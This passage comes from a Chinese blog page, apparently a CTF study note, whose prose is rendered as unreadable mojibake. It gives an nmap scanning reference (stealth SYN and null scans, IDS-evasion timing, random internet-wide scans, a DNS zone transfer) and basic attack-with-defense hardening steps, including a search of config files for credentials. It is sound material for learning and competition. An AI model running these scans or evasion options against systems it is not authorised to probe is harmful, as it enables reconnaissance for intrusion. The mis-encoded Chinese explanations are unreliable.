vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PS -<span class="keyword">p</span> <span class="number">22</span>,<span class="number">80</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">08</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="keyword">open</span>  http</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.165</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="27-æ‰§è¡Œä¸€æ¬¡éšè”½çš„æ‰«æ-sS"><a href="#27-æ‰§è¡Œä¸€æ¬¡éšè”½çš„æ‰«æ-sS" class="headerlink" title="27.æ‰§è¡Œä¸€æ¬¡éšè”½çš„æ‰«æ-sS"></a>27.æ‰§è¡Œä¸€æ¬¡éšè”½çš„æ‰«æ-sS</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sS <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">10</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.383</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="28-ä½¿ç”¨TCP-Synæ‰«ææœ€å¸¸ç”¨çš„ç«¯å£-sT"><a href="#28-ä½¿ç”¨TCP-Synæ‰«ææœ€å¸¸ç”¨çš„ç«¯å£-sT" class="headerlink" title="28.ä½¿ç”¨TCP Synæ‰«ææœ€å¸¸ç”¨çš„ç«¯å£-sT"></a>28.ä½¿ç”¨TCP Synæ‰«ææœ€å¸¸ç”¨çš„ç«¯å£-sT</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sT <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">12</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.406</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="29-æ‰§è¡ŒTCPç©ºæ‰«æä»¥éª—è¿‡é˜²ç«å¢™-sN"><a href="#29-æ‰§è¡ŒTCPç©ºæ‰«æä»¥éª—è¿‡é˜²ç«å¢™-sN" class="headerlink" title="29.æ‰§è¡ŒTCPç©ºæ‰«æä»¥éª—è¿‡é˜²ç«å¢™-sN"></a>29.æ‰§è¡ŒTCPç©ºæ‰«æä»¥éª—è¿‡é˜²ç«å¢™-sN</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -<span class="keyword">sN</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">19</span>:<span class="number">01</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE         SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>|filtered ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>|filtered http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>|filtered rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>|filtered unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>|filtered mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>|filtered <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">1.584</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="æŒ‡ä»¤åˆ†ç±»"><a href="#æŒ‡ä»¤åˆ†ç±»" class="headerlink" title="æŒ‡ä»¤åˆ†ç±»"></a>æŒ‡ä»¤åˆ†ç±»</h3><h4 id="åˆçº§ä½¿ç”¨"><a href="#åˆçº§ä½¿ç”¨" class="headerlink" title="åˆçº§ä½¿ç”¨"></a>åˆçº§ä½¿ç”¨</h4><p>nmap -v scanme.nmap.org</p><p>è¿™ä¸ªé€‰é¡¹æ‰«æä¸»æœºscanme.nmap.orgä¸­æ‰€æœ‰çš„ä¿ç•™TCPç«¯å£ã€‚é€‰é¡¹-vå¯ç”¨ç»†èŠ‚æ¨¡å¼ã€‚</p><p>nmap -A -T4 scanme.nmap.org</p><p>-Aç”¨æ¥è¿›è¡Œæ“ä½œç³»ç»ŸåŠå…¶ç‰ˆæœ¬çš„æ¢æµ‹ï¼Œ-T4 å¯ä»¥åŠ å¿«æ‰§è¡Œé€Ÿåº¦</p><p>nmap -sS -O scanme.nmap.org/24</p><p>è¿›è¡Œç§˜å¯†SYNæ‰«æï¼Œå¯¹è±¡ä¸ºä¸»æœºSaznmeæ‰€åœ¨çš„â€œCç±»â€ç½‘æ®µçš„255å°ä¸»æœºã€‚åŒæ—¶å°è¯•ç¡®å®šæ¯å°å·¥ä½œä¸»æœºçš„æ“ä½œç³»ç»Ÿç±»å‹ã€‚å› ä¸ºè¿›è¡ŒSYNæ‰«æ å’Œæ“ä½œç³»ç»Ÿæ£€æµ‹ï¼Œè¿™ä¸ªæ‰«æéœ€è¦æœ‰æ ¹æƒé™ã€‚</p><p>nmap -sV -p 22ï¼Œ53ï¼Œ110ï¼Œ143ï¼Œ4564 198.116.0-255.1-127</p><p>è¿›è¡Œä¸»æœºåˆ—ä¸¾å’ŒTCPæ‰«æï¼Œå¯¹è±¡ä¸ºBç±»198.116ç½‘æ®µä¸­255ä¸ª8ä½å­ç½‘ã€‚è¿™ ä¸ªæµ‹è¯•ç”¨äºç¡®å®šç³»ç»Ÿæ˜¯å¦è¿è¡Œäº†sshdã€DNSã€imapdæˆ–4564ç«¯å£ã€‚å¦‚æœè¿™äº›ç«¯å£ æ‰“å¼€ï¼Œå°†ä½¿ç”¨ç‰ˆæœ¬æ£€æµ‹æ¥ç¡®å®šå“ªç§åº”ç”¨åœ¨è¿è¡Œã€‚(-sV)</p><p>nmap -v -iR 100000 -P0 -p 80</p><p>éšæœºé€‰æ‹©100000å°ä¸»æœºæ‰«ææ˜¯å¦è¿è¡ŒWebæœåŠ¡å™¨(80ç«¯å£)ã€‚ç”±èµ·å§‹é˜¶æ®µå‘é€æ¢æµ‹æŠ¥æ–‡æ¥ç¡®å®šä¸»æœºæ˜¯å¦å·¥ä½œéå¸¸æµªè´¹æ—¶é—´ï¼Œè€Œä¸”åªéœ€æ¢æµ‹ä¸»æœºçš„ä¸€ä¸ªç«¯å£ï¼Œå› æ­¤ä½¿ç”¨-P0ç¦æ­¢å¯¹ä¸»æœºåˆ—è¡¨ã€‚</p><p>nmap -P0 -p80 -oX logs/pb-port80scan.xml -oG logs/pb-port80scan.gnmap 216.163.128.20/20</p><p>æ‰«æ4096ä¸ªIPåœ°å€ï¼ŒæŸ¥æ‰¾WebæœåŠ¡å™¨(ä¸ping)ï¼Œå°†ç»“æœä»¥Grepå’ŒXMLæ ¼å¼ä¿å­˜ã€‚</p><p>host -l company.com | cut -d -f 4 | nmap -v -iL -</p><p>è¿›è¡ŒDNSåŒºåŸŸä¼ è¾“ï¼Œä»¥å‘ç°company.comä¸­çš„ä¸»æœºï¼Œç„¶åå°†IPåœ°å€æä¾›ç»™ Nmapã€‚ä¸Šè¿°å‘½ä»¤ç”¨äºGNU/Linux â€“ å…¶å®ƒç³»ç»Ÿè¿›è¡ŒåŒºåŸŸä¼ è¾“æ—¶æœ‰ä¸åŒçš„å‘½ä»¤ã€‚</p><h4 id="æ·±å…¥æ‰«æå‘½ä»¤"><a href="#æ·±å…¥æ‰«æå‘½ä»¤" class="headerlink" title="æ·±å…¥æ‰«æå‘½ä»¤"></a>æ·±å…¥æ‰«æå‘½ä»¤</h4><p>-Pn  ä¸æ¢æµ‹æ‰«æï¼ˆå‡å®šæ‰€æœ‰ä¸»æœºéƒ½å­˜æ´»ï¼‰</p><p>-PB  é»˜è®¤æ¢æµ‹æ‰«æï¼ˆæ¢æµ‹ç«¯å£ï¼šTCP 80ï¼Œ445&amp;ICMPï¼‰</p><p>-PS  &lt;portlist&gt;  tcpæ¢æµ‹æ‰«æ</p><p>-PE  ICMP Echo Request</p><p>-PP  ICMP Timestamp Request</p><p>-PM  ICMP Netmask Request</p><h4 id="æ‰«æç±»å‹"><a href="#æ‰«æç±»å‹" class="headerlink" title="æ‰«æç±»å‹"></a>æ‰«æç±»å‹</h4><p>-sP  åªæ¢æµ‹ä¸»æœºåœ¨çº¿æƒ…å†µ</p><p>-sS  SYNæ‰«æï¼ˆéšèº«æ‰«æï¼‰</p><p>-ST  TCPæ‰«æ</p><p>-sU  UDPæ‰«æ</p><p>-sV  ç³»ç»Ÿç‰ˆæœ¬æ£€æµ‹</p><p>-O   æ“ä½œç³»ç»Ÿè¯†åˆ«</p><p>â€“scanflags  æŒ‡å®šTCPæ ‡è¯†ä½ï¼ˆè®¾ç½®URG, ACK, PSH,RST,SYN,FINä½ï¼‰</p><h4 id="ç»†ç²’åº¦çš„æ—¶é—´é€‰é¡¹"><a href="#ç»†ç²’åº¦çš„æ—¶é—´é€‰é¡¹" class="headerlink" title="ç»†ç²’åº¦çš„æ—¶é—´é€‰é¡¹"></a>ç»†ç²’åº¦çš„æ—¶é—´é€‰é¡¹</h4><p>â€“min-hostgroup/max-hostgroup <size>  å¹³è¡Œçš„ä¸»æœºæ‰«æç»„çš„å¤§å°</size></p><p>â€“min-parallelism/max-parallelism <numprobes>  å¹¶è¡Œæ¢æµ‹</numprobes></p><p>â€“min-rtt-timeout/max-rtttimeout/initial-rtt-timeout <time>   æŒ‡å®šæ¯è½®æ¢æµ‹çš„æ—¶é—´</time></p><p>â€“max-retries <tries>    æ‰«ææ¢æµ‹çš„ä¸Šé™æ¬¡æ•°è®¾å®š</tries></p><p>â€“host-timeout <time>    è®¾ç½®timeoutæ—¶é—´</time></p><p>â€“scan-delay/â€“max-scan-delay <time>  è°ƒæ•´ä¸¤æ¬¡æ¢æµ‹ä¹‹é—´çš„å»¶è¿Ÿ</time></p><p>â€“min-rate <number>     æ¯ç§’å‘é€æ•°æ®åŒ…ä¸å°‘äº<number>æ¬¡</number></number></p><h4 id="æ—¶åºé€‰é¡¹"><a href="#æ—¶åºé€‰é¡¹" class="headerlink" title="æ—¶åºé€‰é¡¹"></a>æ—¶åºé€‰é¡¹</h4><p>-T0  åæ‰§çš„ï¼šéå¸¸éå¸¸æ…¢ï¼Œç”¨äºIDSé€ƒé€¸</p><p>-T1  çŒ¥ççš„ï¼šç›¸å½“æ…¢ï¼Œç”¨äºIDSé€ƒé€¸</p><p>-T2  æœ‰ç¤¼è²Œçš„ï¼šé™ä½é€Ÿåº¦ä»¥æ¶ˆè€—æ›´å°çš„å¸¦å®½ï¼Œæ¯”é»˜è®¤æ…¢åå€</p><p>-T3  æ™®é€šçš„ï¼šé»˜è®¤ï¼Œæ ¹æ®ç›®æ ‡çš„ååº”è‡ªåŠ¨è°ƒæ•´æ—¶é—´æ¨¡å¼</p><p>-T4  é‡è›®çš„ï¼šå‡å®šå¤„åœ¨ä¸€ä¸ªå¾ˆå¥½çš„ç½‘ç»œç¯å¢ƒï¼Œè¯·æ±‚å¯èƒ½ä¼šæ·¹æ²¡ç›®æ ‡</p><p>-T5  ç–¯ç‹‚çš„ï¼šéå¸¸é‡è›®ï¼Œå¾ˆå¯èƒ½ä¼šæ·¹æ²¡ç›®æ ‡ç«¯å£æˆ–æ˜¯æ¼æ‰ä¸€äº›å¼€æ”¾ç«¯å£</p><h4 id="miscé€‰é¡¹"><a href="#miscé€‰é¡¹" class="headerlink" title="miscé€‰é¡¹"></a>miscé€‰é¡¹</h4><p>-n  ç¦æ­¢åå‘IPåœ°å€æŸ¥æ‰¾</p><p>-6  åªæ˜¯ç”¨ IPv6</p><p>-A  æ˜¯ç”¨å‡ ä¸ªå‘½ä»¤ï¼šOS æ¢æµ‹ï¼Œç‰ˆæœ¬æ¢æµ‹ï¼Œè„šæœ¬æ‰«æï¼Œtraceroute</p><p>â€“reason åˆ—å‡ºnmapçš„åˆ¤æ–­ï¼šç«¯å£å¼€æ”¾ï¼Œå…³é—­ï¼Œè¢«è¿‡æ»¤ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼"><a href="#è¾“å‡ºæ ¼å¼" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>-oN  æ ‡å‡†è¾“å‡º</p><p>-oG  å¥½ç†è§£çš„æ ¼å¼</p><p>-ox  xmlæ ¼å¼</p><p>-oA&lt;basename&gt;  ç”¨&lt;basename&gt;ç”Ÿæˆä»¥ä¸Šæ ¼å¼çš„æ–‡ä»¶ </p><h3 id="çº¿ä¸‹AWDå¿…é¡»ç”¨å¥½çš„nmapæŒ‡ä»¤"><a href="#çº¿ä¸‹AWDå¿…é¡»ç”¨å¥½çš„nmapæŒ‡ä»¤" class="headerlink" title="çº¿ä¸‹AWDå¿…é¡»ç”¨å¥½çš„nmapæŒ‡ä»¤"></a>çº¿ä¸‹AWDå¿…é¡»ç”¨å¥½çš„nmapæŒ‡ä»¤</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.9</span> ä½¿ç”¨nmapæ‰«æä¸»æœº</span><br><span class="line"><span class="comment">//  http://nmap.org/book/</span></span><br><span class="line">#nmap --version  <span class="comment">// -V -h</span></span><br><span class="line">#man nmap</span><br><span class="line"></span><br><span class="line">#nmap -vv -vvå‚æ•°è®¾ç½®å¯¹ç»“æœçš„è¯¦ç»†è¾“å‡º</span><br><span class="line">#nmap -sS -Pn -A hostéšèº«ã€æ“ä½œç³»ç»Ÿä¿¡æ¯å’Œè·¯ç”±è·Ÿè¸ªã€-P0å’Œ-Pnä¸¤ä¸ªé€‰é¡¹çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œå°±æ˜¯ä¸è¿›è¡Œä¸»æœºå‘ç°ï¼Œè€Œç›´æ¥è¿›è¡Œæ›´æ·±å±‚æ¬¡çš„æ‰«æï¼Œå¦‚æœåŠ¡ç‰ˆæœ¬æ‰«ææˆ–ç³»ç»Ÿç±»å‹æ‰«æã€‚-Pn  ä¸æ¢æµ‹æ‰«æï¼ˆå‡å®šæ‰€æœ‰ä¸»æœºéƒ½å­˜æ´»ï¼‰</span><br><span class="line"></span><br><span class="line">#nmap -A -T4 scanme.nmap.org</span><br><span class="line"><span class="comment">// -A:to enable OS and version detection, script scanning,and traceroute;</span></span><br><span class="line"><span class="comment">// -T4:faster executionåŠ å¿«æ‰§è¡Œé€Ÿåº¦</span></span><br><span class="line"></span><br><span class="line">#nmap localhost</span><br><span class="line"><span class="comment">// #netstat -apn | grep 8080 ===&gt; port 8080 process</span></span><br><span class="line"></span><br><span class="line">*å¤šæœºå¿«é€Ÿæ‰«æ</span><br><span class="line">#nmap -vv -sP <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span>-sPæ˜¯ä½¿ç”¨ICMPåè®®å‘é€echoè¯·æ±‚æ•°æ®åŒ…ï¼Œä½†æ˜¯å¾ˆå®¹æ˜“è¢«é˜²ç«å¢™è¿‡æ»¤æ‰ã€‚</span><br><span class="line"></span><br><span class="line"><span class="comment">// ==&gt;åœ¨çº¿ä¸»æœº</span></span><br><span class="line">#nmap -vv -sP <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'report for.*[<span class="number">0</span><span class="number">-9</span>]$'</span><br><span class="line">#nmap -v -n -sP --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ==&gt;åœ¨çº¿ä¸»æœº:ç«¯å£å¼€æ”¾  -n ç¦æ­¢åå‘IPåœ°å€æŸ¥æ‰¾</span></span><br><span class="line">#nmap -v -n -sS -Pn -p22 --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'open'</span><br><span class="line">#nmap -v -n -sS -Pn -p21ï¼Œ<span class="number">22</span>ï¼Œ<span class="number">80</span>ï¼Œ<span class="number">8080</span>ï¼Œ<span class="number">3306</span> --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'open'</span><br><span class="line">#nmap -v -n -sS -Pn -p1<span class="number">-1024</span> --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'open'</span><br><span class="line">--max-rtt-timeoutè°ƒæ•´æ¢æµ‹æŠ¥æ–‡è¶…æ—¶</span><br><span class="line"></span><br><span class="line">&gt; results.txté‡å®šå‘å‘é€åˆ°æ–‡ä»¶</span><br></pre></td></tr></table></figure><h3 id="ç•ªå¤–AWD"><a href="#ç•ªå¤–AWD" class="headerlink" title="ç•ªå¤–AWD"></a>ç•ªå¤–AWD</h3><p>é™„ä¸ŠAWDåŸºæ“</p><h4 id="1ã€ç¡®å®šç¯å¢ƒæ˜¯å¯†ç ç™»å½•è¿˜æ˜¯å¯†é’¥ç™»å½•"><a href="#1ã€ç¡®å®šç¯å¢ƒæ˜¯å¯†ç ç™»å½•è¿˜æ˜¯å¯†é’¥ç™»å½•" class="headerlink" title="1ã€ç¡®å®šç¯å¢ƒæ˜¯å¯†ç ç™»å½•è¿˜æ˜¯å¯†é’¥ç™»å½•"></a>1ã€ç¡®å®šç¯å¢ƒæ˜¯å¯†ç ç™»å½•è¿˜æ˜¯å¯†é’¥ç™»å½•</h4><p>å¯†é’¥ç™»å½•ï¼šï¼ˆæ¯”èµ›æ–¹ä¼šæä¾›å¦‚ä¸‹ä¸‰ä¸ªæ–‡ä»¶ï¼‰</p><p>id_rsa</p><p>id_rsa.pub</p><p>token.txt</p><p>æ–‡ä»¶å¯¼å…¥å³å¯</p><p>è‹¥ä¸ºå¯†ç ç™»å½•ï¼Œåˆ™çœ‹å¯†ç æ˜¯å¦ä¸ºéšæœºçš„å“ˆå¸Œå€¼ï¼Œå¹¶æ¨æµ‹å…¨åœºå¯†ç æ˜¯å¦ä¸€æ ·ï¼Œè‹¥ä¸€æ ·åˆ™é¦–å…ˆéœ€è¦ä¿®æ”¹å¯†ç ï¼Œé¿å…å¯¹æ–¹å†™æ‰¹é‡éå†è„šæœ¬ï¼Œéå†æ‰€æœ‰æœåŠ¡å™¨ï¼Œå½“å¯ä»¥ç™»å½•æ—¶ï¼Œå°±ç¬é—´ä¿®æ”¹ä½ çš„æœºå­ï¼Œç„¶åä½ å°±ä»€ä¹ˆéƒ½åšä¸äº†ï¼ŒæœåŠ¡å™¨éƒ½è½åˆ°å¯¹æ–¹æ‰‹ä¸­ï¼Œé™¤éé‡ç½®æœºå­ã€‚</p><p>ä¿®æ”¹å¯†ç ï¼špasswd ç”¨æˆ·å    //linuxå‘½ä»¤</p><p>â€‹                    passwd ubuntu sudo passwd root   //ubuntuå‘½ä»¤ï¼š </p><p>â€‹                    w   //æŸ¥çœ‹å½“å‰ç™»å½•çš„ç”¨æˆ· </p><p>â€‹                    kill -kill -t ç”¨æˆ·çš„tty   //è¸¢æ‰å½“å‰ç™»å½•çš„ç”¨æˆ·</p><h4 id="2ã€è¿…é€Ÿå¤‡ä»½æºç å’Œæ•°æ®åº“åˆ°æœ¬æœº"><a href="#2ã€è¿…é€Ÿå¤‡ä»½æºç å’Œæ•°æ®åº“åˆ°æœ¬æœº" class="headerlink" title="2ã€è¿…é€Ÿå¤‡ä»½æºç å’Œæ•°æ®åº“åˆ°æœ¬æœº"></a>2ã€è¿…é€Ÿå¤‡ä»½æºç å’Œæ•°æ®åº“åˆ°æœ¬æœº</h4><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/<span class="regexp">/è¿™é‡Œå‡å®šwebç›®å½•ä¸º/var</span><span class="regexp">/www/html</span></span><br><span class="line">mkdir -p ~<span class="regexp">/beifen</span></span><br><span class="line"><span class="regexp">cp -ra /var</span><span class="regexp">/www/html</span><span class="regexp">/. ~/beifen</span></span><br><span class="line">å…¶ä¸­~ä»£è¡¨ç”¨æˆ·çš„å®¶ç›®å½•ï¼Œ-ræ˜¯é€’å½’ï¼Œ-aæ˜¯ä¿ç•™åŸæ¥æ–‡ä»¶å±æ€§ï¼Œ .æ˜¯ä»£è¡¨æ‰€æœ‰æ–‡ä»¶ï¼ˆä¸ç”¨*ï¼Œå› ä¸º*æ— æ³•è¡¨ç¤ºæ‰€æœ‰æ–‡ä»¶ï¼‰</span><br></pre></td></tr></table></figure><p>å®šæ—¶å¤‡ä»½æºç ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> [ 1 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">time=`/bin/date +%H-%M-%S`</span><br><span class="line">bak_file=<span class="string">"/var/www/<span class="variable">$time</span>.tar.gz"</span></span><br><span class="line">webdir=<span class="string">"/var/www/html"</span></span><br><span class="line">tar zcvf <span class="variable">$bak_file</span> <span class="variable">$webdir</span> &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">sleep 60                               //ä¸€åˆ†é’Ÿå¤‡ä»½ä¸€æ¬¡</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h4 id="3ã€æ‰¾é…ç½®æ–‡ä»¶-amp-mysqlä¸€äº›æ“ä½œ"><a href="#3ã€æ‰¾é…ç½®æ–‡ä»¶-amp-mysqlä¸€äº›æ“ä½œ" class="headerlink" title="3ã€æ‰¾é…ç½®æ–‡ä»¶&amp;mysqlä¸€äº›æ“ä½œ"></a>3ã€æ‰¾é…ç½®æ–‡ä»¶&amp;mysqlä¸€äº›æ“ä½œ</h4><p>æ‰¾é…ç½®æ–‡ä»¶ï¼Œæ‰¾æ–‡ä»¶åæœ‰conã€configã€dbå­—æ ·çš„ã€‚åœ¨åˆšæ‰å¤‡ä»½çš„æ–‡ä»¶é‚£é‡Œå¯ä»¥ä½¿ç”¨linuxå‘½ä»¤</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> . -<span class="built_in">name</span> <span class="string">'*name*'</span></span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°è¿™äº›æ–‡ä»¶åï¼Œæœ€ä¸»è¦æ‰¾ä¸€äº›è´¦å·å¯†ç ï¼Œä¾‹å¦‚mysqlè´¦å·å¯†ç ï¼Œå¦‚æœæ‰¾åˆ°äº†ï¼Œè‡ªå·±å¯ä»¥ä¿®æ”¹è‡ªå·±æœåŠ¡å™¨ä¸Šçš„mysqlå¯†ç ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼šï¼ˆå…ˆè‡ªå·±ç™»é™†è¿›å»ï¼‰</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; update<span class="built_in"> user </span><span class="builtin-name">set</span> <span class="attribute">password</span>=PASSWORD("æ–°çš„å¯†ç ") where <span class="attribute">user</span>=<span class="string">'root'</span>; 